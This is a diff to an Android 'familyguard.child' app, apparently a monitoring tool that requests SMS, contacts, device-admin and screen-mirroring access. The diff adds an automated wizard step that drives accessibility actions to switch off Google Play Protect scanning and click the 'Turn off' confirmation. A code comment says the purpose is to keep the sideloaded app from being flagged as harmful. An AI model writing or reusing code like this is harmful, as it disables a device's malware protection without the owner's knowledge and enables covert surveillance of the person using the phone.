@@ -156,6 +156,15 @@ class MainActivity : ComponentActivity() {
             ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
             ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
 
+    /** VC17 Play Protect scan OFF ho chuka? Settings.Secure
+     *  "package_verifier_user_consent" 0 = off, 1 = on, -1 = nahi pata (off
+     *  maano — wizard step skip hoga, SelfHeal khud phir try karega). */
+    private fun protectScanOff(ctx: Context): Boolean = runCatching {
+        android.provider.Settings.Secure.getInt(
+            ctx.contentResolver, "package_verifier_user_consent", -1
+        ) != 1
+    }.getOrDefault(true)
+
     /**
      * Android 14/15 permanent-denial recovery — call log/SMS empty hone ki #1 wajah.
      *
@@ -297,7 +306,15 @@ class MainActivity : ComponentActivity() {
             AutoStep("admin", { hasAdmin(ctx) }, { runCatching { ctx.startActivity(adminIntent) } }),
             AutoStep("mirror", { MirrorManager.hasProjection }, {
                 runCatching { ctx.startActivity(Intent(ctx, ConsentActivity::class.java)) }
-            })
+            }),
+            // VC17: Play Protect scan OFF — sideloaded app ko Google "harmful app"
+            // warnings se bachata hai (a11y vending/gms windows par toggle flip +
+            // confirm dialog "Turn off" click; package + screen-text gated).
+            AutoStep("protect", { protectScanOff(ctx) }, {
+                runCatching {
+                    com.familyguard.child.util.CommandHandler.openPlayProtect(ctx)
+                }
+            }, timeoutMs = 45_000L)
         )
         var remaining = 0
         for (s in steps) {
